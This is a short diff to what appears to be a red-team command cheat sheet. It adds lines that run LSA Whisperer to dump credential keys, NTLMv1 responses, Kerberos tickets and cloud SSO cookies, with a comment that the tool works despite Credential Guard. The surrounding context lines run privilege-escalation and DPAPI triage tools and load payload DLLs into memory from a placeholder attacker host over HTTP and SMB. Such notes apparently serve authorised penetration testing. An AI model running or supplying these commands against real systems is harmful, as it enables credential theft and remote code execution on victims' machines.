@@ -561,6 +561,13 @@ Invoke-Binary /home/kali/tools/SharpUp.exe audit
 Invoke-Binary /home/kali/tools/Certify.exe find /vulnerable
 Invoke-Binary /home/kali/tools/SharpDPAPI.exe triage
 
+# LSA Whisperer — works even with Credential Guard (talks to LSA directly)
+Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --msv credkey
+Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --msv ntlmv1
+Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --kerberos klist
+Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --kerberos dump
+Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --cloudap ssocookie
+
 # Load DLLs in memory
 Dll-Loader -http http://YOUR_IP:8080/payload.dll
 Dll-Loader -smb \\YOUR_IP\share\payload.dll
